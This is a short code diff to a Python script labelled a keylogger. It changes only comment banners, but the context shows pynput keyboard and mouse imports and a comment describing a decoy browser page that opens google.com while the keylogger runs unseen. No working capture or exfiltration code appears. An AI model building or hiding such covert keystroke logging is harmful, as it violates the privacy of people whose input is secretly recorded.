@@ -1,4 +1,4 @@
-# ------ Keylogger ------
+# ========== Keylogger ==========
 
 import logging
 import os
@@ -6,7 +6,7 @@ import webbrowser
 
 from pynput import keyboard, mouse
 
-# ---------- Fake Browser ---------
+# ========== Fake Browser ==========
 
 # Creating a "fake" browser page where it actually runs the keylogger
 url = 'http://www.google.com'
